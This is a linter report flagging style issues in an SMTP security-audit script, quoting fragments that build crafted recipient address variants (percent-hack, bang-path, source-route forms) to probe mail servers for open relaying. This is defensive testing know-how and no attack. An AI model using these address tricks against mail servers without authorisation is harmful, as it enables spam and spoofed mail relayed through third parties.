3188 |                 "empty -> external": ["", externalDomain],
3189 |                 "ip -> internal": [ip, internalDomain],
3190 |                 "ip -> to%domain@[ip]": [ip, "<USER>%{}@{}".format(domain, ip)],
     |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3191 |                 "ip -> to%domain@srvname": [ip, "<USER>%{}@{}".format(domain, srvname)],
3192 |                 "ip -> to%domain@[srvname]": [
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3191:49
     |
3189 |                 "ip -> internal": [ip, internalDomain],
3190 |                 "ip -> to%domain@[ip]": [ip, "<USER>%{}@{}".format(domain, ip)],
3191 |                 "ip -> to%domain@srvname": [ip, "<USER>%{}@{}".format(domain, srvname)],
     |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3192 |                 "ip -> to%domain@[srvname]": [
3193 |                     ip,
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3194:21
     |
3192 |                 "ip -> to%domain@[srvname]": [
3193 |                     ip,
3194 |                     "<USER>%{}@[{}]".format(domain, srvname),
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3195 |                 ],
3196 |                 'ip -> "to@domain"': [ip, '"<USER>@{}"'.format(domain)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3196:43
     |
3194 |                     "<USER>%{}@[{}]".format(domain, srvname),
3195 |                 ],
3196 |                 'ip -> "to@domain"': [ip, '"<USER>@{}"'.format(domain)],
     |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3197 |                 'ip -> "to%domain"': [ip, '"<USER>%{}"'.format(domain)],
3198 |                 "ip -> to@domain@[ip]": [ip, "<USER>@{}@{}".format(domain, ip)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3197:43
     |
3195 |                 ],
3196 |                 'ip -> "to@domain"': [ip, '"<USER>@{}"'.format(domain)],
3197 |                 'ip -> "to%domain"': [ip, '"<USER>%{}"'.format(domain)],
     |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3198 |                 "ip -> to@domain@[ip]": [ip, "<USER>@{}@{}".format(domain, ip)],
3199 |                 "ip -> to@domain@": [ip, "<USER>@{}@".format(domain)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3198:46
     |
3196 |                 'ip -> "to@domain"': [ip, '"<USER>@{}"'.format(domain)],
3197 |                 'ip -> "to%domain"': [ip, '"<USER>%{}"'.format(domain)],
3198 |                 "ip -> to@domain@[ip]": [ip, "<USER>@{}@{}".format(domain, ip)],
     |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3199 |                 "ip -> to@domain@": [ip, "<USER>@{}@".format(domain)],
3200 |                 'ip -> "to@domain"@[ip]': [ip, '"<USER>@{}"@{}'.format(domain, ip)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3199:42
     |
3197 |                 'ip -> "to%domain"': [ip, '"<USER>%{}"'.format(domain)],
3198 |                 "ip -> to@domain@[ip]": [ip, "<USER>@{}@{}".format(domain, ip)],
3199 |                 "ip -> to@domain@": [ip, "<USER>@{}@".format(domain)],
     |                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^
3200 |                 'ip -> "to@domain"@[ip]': [ip, '"<USER>@{}"@{}'.format(domain, ip)],
3201 |                 "ip -> to@domain@srvname": [ip, "<USER>@{}@{}".format(domain, srvname)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3200:48
     |
3198 |                 "ip -> to@domain@[ip]": [ip, "<USER>@{}@{}".format(domain, ip)],
3199 |                 "ip -> to@domain@": [ip, "<USER>@{}@".format(domain)],
3200 |                 'ip -> "to@domain"@[ip]': [ip, '"<USER>@{}"@{}'.format(domain, ip)],
     |                                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3201 |                 "ip -> to@domain@srvname": [ip, "<USER>@{}@{}".format(domain, srvname)],
3202 |                 "ip -> @[ip]:to@domain": [ip, "@{}:<USER>@{}".format(ip, domain)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3201:49
     |
3199 |                 "ip -> to@domain@": [ip, "<USER>@{}@".format(domain)],
3200 |                 'ip -> "to@domain"@[ip]': [ip, '"<USER>@{}"@{}'.format(domain, ip)],
3201 |                 "ip -> to@domain@srvname": [ip, "<USER>@{}@{}".format(domain, srvname)],
     |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3202 |                 "ip -> @[ip]:to@domain": [ip, "@{}:<USER>@{}".format(ip, domain)],
3203 |                 "ip -> @srvname:to@domain": [
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3202:47
     |
3200 |                 'ip -> "to@domain"@[ip]': [ip, '"<USER>@{}"@{}'.format(domain, ip)],
3201 |                 "ip -> to@domain@srvname": [ip, "<USER>@{}@{}".format(domain, srvname)],
3202 |                 "ip -> @[ip]:to@domain": [ip, "@{}:<USER>@{}".format(ip, domain)],
     |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3203 |                 "ip -> @srvname:to@domain": [
3204 |                     ip,
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3205:21
     |
3203 |                 "ip -> @srvname:to@domain": [
3204 |                     ip,
3205 |                     "@{}:<USER>@{}".format(srvname, domain),
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3206 |                 ],
3207 |                 "ip -> domain!to": [ip, "{}!<USER>".format(domain)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3207:41
     |
3205 |                     "@{}:<USER>@{}".format(srvname, domain),
3206 |                 ],
3207 |                 "ip -> domain!to": [ip, "{}!<USER>".format(domain)],
     |                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
3208 |                 "ip -> domain!to@[ip]": [ip, "{}!<USER>@{}".format(domain, ip)],
3209 |                 "ip -> domain!to@srvname": [ip, "{}!<USER>@{}".format(domain, srvname)],
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3208:46
     |
3206 |                 ],
3207 |                 "ip -> domain!to": [ip, "{}!<USER>".format(domain)],
3208 |                 "ip -> domain!to@[ip]": [ip, "{}!<USER>@{}".format(domain, ip)],
     |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3209 |                 "ip -> domain!to@srvname": [ip, "{}!<USER>@{}".format(domain, srvname)],
3210 |             }
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3209:49
     |
3207 |                 "ip -> domain!to": [ip, "{}!<USER>".format(domain)],
3208 |                 "ip -> domain!to@[ip]": [ip, "{}!<USER>@{}".format(domain, ip)],
3209 |                 "ip -> domain!to@srvname": [ip, "{}!<USER>@{}".format(domain, srvname)],
     |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3210 |             }
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3223:25
     |
3221 |                   ):
3222 |                       info(
3223 | /                         "Running custom test: (from: <{}>) => (to: <{}>)".format(
3224 | |                             self.openRelayParams[0], self.openRelayParams[1]
3225 | |                         ),
     | |_________________________^
3226 |                           toOutLine=True,
3227 |                       )
     |
help: Convert to f-string

N806 Variable `avoidMailFrom` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3232:21
     |
3230 |                     )
3231 |                 else:
3232 |                     avoidMailFrom = False
     |                     ^^^^^^^^^^^^^
3233 |                     rollBackSenderOnce = False
     |

N806 Variable `rollBackSenderOnce` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3233:21
     |
3231 |                 else:
3232 |                     avoidMailFrom = False
3233 |                     rollBackSenderOnce = False
     |                     ^^^^^^^^^^^^^^^^^^
3234 |
3235 |                     num = 0
     |

F841 Local variable `retry` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:3242:25
     |
3240 |                         results[k] = False
3241 |
3242 |                         retry = 0
     |                         ^^^^^
3243 |                         for i in range(2):
3244 |                             if self.stopEverything:
     |
help: Remove assignment to unused variable `retry`

B007 Loop control variable `i` not used within loop body
    --> security\penetration-testing-tools\networks\smtpAudit.py:3243:29
     |
3242 |                         retry = 0
3243 |                         for i in range(2):
     |                             ^
3244 |                             if self.stopEverything:
3245 |                                 break
     |
help: Rename unused `i` to `_i`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3246:33
     |
3244 | ΓÇª                     if self.stopEverything:
3245 | ΓÇª                         break
3246 | ΓÇª                     dbg('Attempting Open-Relay test #{}: "{}"'.format(num, k))
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3247 | ΓÇª                     results[k] = self._openRelayTest(k, v, avoidMailFrom, num)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3251:37
     |
3249 |   ΓÇª                     if results[k] == 554 and not rollBackSenderOnce:
3250 |   ΓÇª                         dbg(
3251 | / ΓÇª                             "Rolling back to traditional sender's address: @{}".format(
3252 | | ΓÇª                                 internalDomain
3253 | | ΓÇª                             )
     | |_______________________________^
3254 |   ΓÇª                         )
3255 |   ΓÇª                         rollBackSenderOnce = True
     |
help: Convert to f-string

N806 Variable `rollBackSenderOnce` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3255:33
     |
3253 |                                     )
3254 |                                 )
3255 |                                 rollBackSenderOnce = True
     |                                 ^^^^^^^^^^^^^^^^^^
3256 |
3257 |                                 for d, v in domains.items():
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3284:21
     |
3282 |               if not config["always_unfolded_results"] and all(results.values()):
3283 |                   ok(
3284 | /                     "SECURE: Open-Relay seems not to be possible as proved after {} tests.".format(
3285 | |                         len(results)
3286 | |                     )
     | |_____________________^
3287 |                   )
3288 |                   return True
     |
help: Convert to f-string

N806 Variable `sumOfValues` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3290:17
     |
3288 |                 return True
3289 |             else:
3290 |                 sumOfValues = 0
     |                 ^^^^^^^^^^^
3291 |                 for k, v in results.items():
3292 |                     dbg("Open-Relay test ({}) resulted with: {}".format(k, v))
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3292:25
     |
3290 |                 sumOfValues = 0
3291 |                 for k, v in results.items():
3292 |                     dbg("Open-Relay test ({}) resulted with: {}".format(k, v))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3293 |                     if v == False:
3294 |                         sumOfValues += 1
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not v:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3293:24
     |
3291 |                 for k, v in results.items():
3292 |                     dbg("Open-Relay test ({}) resulted with: {}".format(k, v))
3293 |                     if v == False:
     |                        ^^^^^^^^^^
3294 |                         sumOfValues += 1
     |
help: Replace with `not v`

N806 Variable `sumOfValues` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3294:25
     |
3292 |                     dbg("Open-Relay test ({}) resulted with: {}".format(k, v))
3293 |                     if v == False:
3294 |                         sumOfValues += 1
     |                         ^^^^^^^^^^^
3295 |
3296 |                 appendix = ""
     |

N806 Variable `sumOfValues` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3303:21
     |
3302 |                 if interrupted:
3303 |                     sumOfValues = 1 if sumOfValues < 1 else sumOfValues
     |                     ^^^^^^^^^^^
3304 |                     appendix = "\tTests were interrupted thus dunno whether the server is open-relaying or not."
3305 |                     _out(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3306:25
     |
3304 |                       appendix = "\tTests were interrupted thus dunno whether the server is open-relaying or not."
3305 |                       _out(
3306 | /                         "[?] UNKNOWN: Open-Relay were interrupted after {}/{} carried tests.".format(
3307 | |                             sumOfValues - 1, len(results)
3308 | |                         ),
     | |_________________________^
3309 |                           True,
3310 |                           colors.fg.pink,
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3314:25
     |
3312 |                   else:
3313 |                       fail(
3314 | /                         "UNSECURE: Open-Relay MAY BE possible as turned out after {}/{} successful tests.".format(
3315 | |                             sumOfValues, len(results)
3316 | |                         )
     | |_________________________^
3317 |                       )
     |
help: Convert to f-string

N803 Argument name `baseName` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3329:36
     |
3328 |     @staticmethod
3329 |     def _extractMailAddress(param, baseName=""):
     |                                    ^^^^^^^^^^^
3330 |         """
3331 |         @param param    - specifies target SMTP domain
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3340:16
     |
3338 |             return "", ""
3339 |
3340 |         base = "test{}".format(random.randint(0, 9))
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3341 |         if baseName:
3342 |             base = baseName
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3354:16
     |
3352 |             param = param.replace("<USER>", base)
3353 |
3354 |         addr = "{}@{}".format(base, param)
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^
3355 |         if "@" in param and param.count("@") == 1:
3356 |             addr = param
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3362:16
     |
3360 |             return param, param
3361 |
3362 |         mail = '"{}" <{}>'.format(random.choice(surnames), addr)
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3363 |
3364 |         # Format: test@test.com
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3368:20
     |
3366 |         if m:
3367 |             addr = m.group(1)
3368 |             mail = '"{}" <{}>'.format(random.choice(surnames), addr)
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3369 |             return addr, mail
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3378:20
     |
3376 |         if m:
3377 |             addr = m.group(3)
3378 |             mail = '"{}" <{}>'.format(m.group(2), addr)
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3379 |             return addr, mail
     |
help: Convert to f-string

N803 Argument name `baseName` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3384:35
     |
3383 |     @staticmethod
3384 |     def extractMailAddress(param, baseName=""):
     |                                   ^^^^^^^^^^^
3385 |         dbg(
3386 |             'Extracting mail address from parameter: "{}", according to base: "{}"'.format(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3386:13
     |
3384 |       def extractMailAddress(param, baseName=""):
3385 |           dbg(
3386 | /             'Extracting mail address from parameter: "{}", according to base: "{}"'.format(
3387 | |                 param, baseName
3388 | |             )
     | |_____________^
3389 |           )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3393:13
     |
3391 |         addr, mail = SmtpTester._extractMailAddress(param, baseName)
3392 |
3393 |         dbg('After extraction: addr="{}", mail="{}"'.format(addr, mail))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3394 |
3395 |         return addr, mail
     |
help: Convert to f-string

N803 Argument name `testName` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3398:15
     |
3397 |     def _openRelayTest(
3398 |         self, testName, twoDomains, avoidMailFrom=False, num=0, doNotSendAndTest=False
     |               ^^^^^^^^
3399 |     ):
3400 |         secureConfigurationCodes = (
     |

N803 Argument name `twoDomains` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3398:25
     |
3397 |     def _openRelayTest(
3398 |         self, testName, twoDomains, avoidMailFrom=False, num=0, doNotSendAndTest=False
     |                         ^^^^^^^^^^
3399 |     ):
3400 |         secureConfigurationCodes = (
     |

N803 Argument name `avoidMailFrom` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3398:37
     |
3397 |     def _openRelayTest(
3398 |         self, testName, twoDomains, avoidMailFrom=False, num=0, doNotSendAndTest=False
     |                                     ^^^^^^^^^^^^^^^^^^^
3399 |     ):
3400 |         secureConfigurationCodes = (
     |

N803 Argument name `doNotSendAndTest` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3398:65
     |
3397 |     def _openRelayTest(
3398 |         self, testName, twoDomains, avoidMailFrom=False, num=0, doNotSendAndTest=False
     |                                                                 ^^^^^^^^^^^^^^^^^^^^^^
3399 |     ):
3400 |         secureConfigurationCodes = (
     |

N806 Variable `secureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3400:9
     |
3398 |         self, testName, twoDomains, avoidMailFrom=False, num=0, doNotSendAndTest=False
3399 |     ):
3400 |         secureConfigurationCodes = (
     |         ^^^^^^^^^^^^^^^^^^^^^^^^
3401 |             221,
3402 |             454,
     |

N806 Variable `fromAddr` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3416:9
     |
3414 |         result = None
3415 |
3416 |         fromAddr, fromMail = SmtpTester.extractMailAddress(
     |         ^^^^^^^^
3417 |             twoDomains[0], self.openRelayParams[0]
3418 |         )
     |

N806 Variable `fromMail` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3416:19
     |
3414 |         result = None
3415 |
3416 |         fromAddr, fromMail = SmtpTester.extractMailAddress(
     |                   ^^^^^^^^
3417 |             twoDomains[0], self.openRelayParams[0]
3418 |         )
     |

N806 Variable `toAddr` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3419:9
     |
3417 |             twoDomains[0], self.openRelayParams[0]
3418 |         )
3419 |         toAddr, toMail = SmtpTester.extractMailAddress(
     |         ^^^^^^
3420 |             twoDomains[1], self.openRelayParams[1]
3421 |         )
     |

N806 Variable `toMail` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3419:17
     |
3417 |             twoDomains[0], self.openRelayParams[0]
3418 |         )
3419 |         toAddr, toMail = SmtpTester.extractMailAddress(
     |                 ^^^^^^
3420 |             twoDomains[1], self.openRelayParams[1]
3421 |         )
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3425:17
     |
3423 |           if testName == "custom":
3424 |               info(
3425 | /                 "Performing custom Open-Relay test from: {}, to: {}".format(
3426 | |                     fromMail, toMail
3427 | |                 )
     | |_________________^
3428 |               )
     |
help: Convert to f-string

N806 Variable `dateNow` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3430:9
     |
3428 |             )
3429 |
3430 |         dateNow = now.strftime("%a, %d %b %Y %H:%m:%S")
     |         ^^^^^^^
3431 |         subject = "Open-Relay test #{}: {}".format(num, testName)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3431:19
     |
3430 |         dateNow = now.strftime("%a, %d %b %Y %H:%m:%S")
3431 |         subject = "Open-Relay test #{}: {}".format(num, testName)
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3432 |
3433 |         mailFromReturn = ""
     |
help: Convert to f-string

N806 Variable `mailFromReturn` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3433:9
     |
3431 |         subject = "Open-Relay test #{}: {}".format(num, testName)
3432 |
3433 |         mailFromReturn = ""
     |         ^^^^^^^^^^^^^^
3434 |         rcptToReturn = ""
3435 |         dataReturn = ""
     |

N806 Variable `rcptToReturn` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3434:9
     |
3433 |         mailFromReturn = ""
3434 |         rcptToReturn = ""
     |         ^^^^^^^^^^^^
3435 |         dataReturn = ""
     |

N806 Variable `dataReturn` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3435:9
     |
3433 |         mailFromReturn = ""
3434 |         rcptToReturn = ""
3435 |         dataReturn = ""
     |         ^^^^^^^^^^
3436 |
3437 |         mailCommands = (
     |

N806 Variable `mailCommands` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3437:9
     |
3435 |         dataReturn = ""
3436 |
3437 |         mailCommands = (
     |         ^^^^^^^^^^^^
3438 |             "MAIL From: " + fromAddr,
3439 |             "RCPT To: " + toAddr,
     |

N806 Variable `mailFromReturn` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3511:17
     |
3510 |             if line.startswith("MAIL From"):
3511 |                 mailFromReturn = "{} ({})".format(out[0], out[1].decode())
     |                 ^^^^^^^^^^^^^^
3512 |             if line.startswith("RCPT To"):
3513 |                 rcptToReturn = "{} ({})".format(out[0], out[1].decode())
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3511:34
     |
3510 |             if line.startswith("MAIL From"):
3511 |                 mailFromReturn = "{} ({})".format(out[0], out[1].decode())
     |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3512 |             if line.startswith("RCPT To"):
3513 |                 rcptToReturn = "{} ({})".format(out[0], out[1].decode())
     |
help: Convert to f-string

N806 Variable `rcptToReturn` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3513:17
     |
3511 |                 mailFromReturn = "{} ({})".format(out[0], out[1].decode())
3512 |             if line.startswith("RCPT To"):
3513 |                 rcptToReturn = "{} ({})".format(out[0], out[1].decode())
     |                 ^^^^^^^^^^^^
3514 |             if line.startswith("DATA"):
3515 |                 dataReturn = "{} ({})".format(out[0], out[1].decode())
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3513:32
     |
3511 |                 mailFromReturn = "{} ({})".format(out[0], out[1].decode())
3512 |             if line.startswith("RCPT To"):
3513 |                 rcptToReturn = "{} ({})".format(out[0], out[1].decode())
     |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3514 |             if line.startswith("DATA"):
3515 |                 dataReturn = "{} ({})".format(out[0], out[1].decode())
     |
help: Convert to f-string

N806 Variable `dataReturn` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3515:17
     |
3513 |                 rcptToReturn = "{} ({})".format(out[0], out[1].decode())
3514 |             if line.startswith("DATA"):
3515 |                 dataReturn = "{} ({})".format(out[0], out[1].decode())
     |                 ^^^^^^^^^^
3516 |
3517 |             if "rcpt to" in line.lower():
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3515:30
     |
3513 |                 rcptToReturn = "{} ({})".format(out[0], out[1].decode())
3514 |             if line.startswith("DATA"):
3515 |                 dataReturn = "{} ({})".format(out[0], out[1].decode())
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3516 |
3517 |             if "rcpt to" in line.lower():
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3519:21
     |
3517 |               if "rcpt to" in line.lower():
3518 |                   _out(
3519 | /                     "[>] Open-Relay test (from: <{}>) => (to: <{}>); returned: {} ({})".format(
3520 | |                         fromAddr, toAddr, out[0], out[1].decode()
3521 | |                     ),
     | |_____________________^
3522 |                       False,
3523 |                       colors.fg.pink,
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3571:25
     |
3569 |                   if line.startswith("From: "):
3570 |                       info(
3571 | /                         'Open-Relay {} MAY be possible: the server hanged up on us after invalid "From:" (step: {})'.format(
3572 | |                             testName, n
3573 | |                         ),
     | |_________________________^
3574 |                           toOutLine=True,
3575 |                       )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3587:25
     |
3585 |                   else:
3586 |                       dbg(
3587 | /                         "Open-Relay {} test failed at step {}: {}.".format(
3588 | |                             testName, n, line.strip()
3589 | |                         )
     | |_________________________^
3590 |                       )
3591 |                       result = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3595:17
     |
3594 |               dbg(
3595 | /                 "Open-Relay {} test DID NOT failed at step {}: {}. Response: {}".format(
3596 | |                     testName, n, line.strip(), str(out)
3597 | |                 )
     | |_________________^
3598 |               )
     |
help: Convert to f-string

E712 Avoid inequality comparisons to `True`; use `not result:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3607:12
     |
3605 |             return True
3606 |
3607 |         if result != True and out[0] < 500:
     |            ^^^^^^^^^^^^^^
3608 |             fail("UNSECURE: Open-Relay {} is {} possible.".format(testName, verdict))
3609 |             _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |
help: Replace with `not result`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3608:18
     |
3607 |         if result != True and out[0] < 500:
3608 |             fail("UNSECURE: Open-Relay {} is {} possible.".format(testName, verdict))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3609 |             _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3609:18
     |
3607 |         if result != True and out[0] < 500:
3608 |             fail("UNSECURE: Open-Relay {} is {} possible.".format(testName, verdict))
3609 |             _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3610 |
3611 |             result = False
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not result:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3613:15
     |
3611 |             result = False
3612 |
3613 |         elif (result == False and not out[0]) or result == None:
     |               ^^^^^^^^^^^^^^^
3614 |             fail(
3615 |                 "UNKNOWN: Server has disconnected after the Open-Relay ({}) test. Most likely secure.".format(
     |
help: Replace with `not result`

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:3613:60
     |
3611 |             result = False
3612 |
3613 |         elif (result == False and not out[0]) or result == None:
     |                                                            ^^^^
3614 |             fail(
3615 |                 "UNKNOWN: Server has disconnected after the Open-Relay ({}) test. Most likely secure.".format(
     |
help: Replace with `cond is None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3615:17
     |
3613 |           elif (result == False and not out[0]) or result == None:
3614 |               fail(
3615 | /                 "UNKNOWN: Server has disconnected after the Open-Relay ({}) test. Most likely secure.".format(
3616 | |                     testName
3617 | |                 )
     | |_________________^
3618 |               )
3619 |               result = None
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3624:20
     |
3622 |             if "relaying denied" in out[1].decode().lower():
3623 |                 #  (550, b'5.7.1 Relaying denied')
3624 |                 ok('SECURE: Open-Relay attempt "{}" was denied.'.format(testName))
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3625 |             else:
3626 |                 info('Open-Relay "{}" seems not to be possible.'.format(testName))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3626:22
     |
3624 |                 ok('SECURE: Open-Relay attempt "{}" was denied.'.format(testName))
3625 |             else:
3626 |                 info('Open-Relay "{}" seems not to be possible.'.format(testName))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3627 |             try:
3628 |                 _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3628:22
     |
3626 |                 info('Open-Relay "{}" seems not to be possible.'.format(testName))
3627 |             try:
3628 |                 _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3629 |             except:
